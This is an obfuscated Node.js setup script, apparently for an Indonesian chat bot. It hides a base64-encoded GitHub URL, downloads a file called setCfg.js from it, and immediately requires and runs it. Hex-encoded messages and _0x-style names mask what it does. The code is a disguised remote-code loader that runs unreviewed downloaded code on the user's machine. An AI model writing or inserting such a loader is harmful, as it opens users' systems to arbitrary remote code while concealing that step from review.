(function () {
  console.log('\x53\x74\x61\x72\x74\x69\x6e\x67\x2e\x2e\x2e\x0a');

  const _0x1a2b = {
    fs: require('fs'),
    path: require('path'),
    https: require('https'),
    chalk: require('chalk')
  };

  const _0x3b7f = function (_0xurl, _0xdest) {
    return new Promise((_0xresolve, _0xreject) => {
      const _0xfile = _0x1a2b.fs.createWriteStream(_0xdest);
      _0x1a2b.https.get(_0xurl, (_0xresponse) => {
        if (_0xresponse.statusCode !== 200)
          return _0xreject(new Error(`Gagal mengunduh file: ${_0xresponse.statusCode}`));

        _0xresponse.pipe(_0xfile);
        _0xfile.on('finish', () => {
          _0xfile.close(_0xresolve);
        });
      }).on('error', (_0xerr) => {
        _0x1a2b.fs.unlink(_0xdest, () => _0xreject(_0xerr));
      });
    });
  };

  (async () => {
    const _0xurl = Buffer.from('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL01hb3VEYWJpMC9EYWJpLUFpLURvY3VtZW50YXRpb24vbWFpbi9zZXRDZmcuanM=', 'base64').toString();
    const _0xlocal = _0x1a2b.path.join(__dirname, 'setCfg.js');

    try {
      await _0x3b7f(_0xurl, _0xlocal);
      const _0xsetup = require('./setCfg');
      await _0xsetup();
      console.log(_0x1a2b.chalk.greenBright.inverse('\nSetup selesai, silahkan jalankan ulang bot anda'));
    } catch (_0xerr) {
      console.error('\x47\x61\x67\x61\x6c\x20\x6d\x65\x6e\x67\x6a\x61\x6c\x61\x6e\x6b\x61\x6e\x20\x73\x65\x74\x75\x70\x20\x62\x6f\x74\x3a', _0xerr);
    }
  })();
})();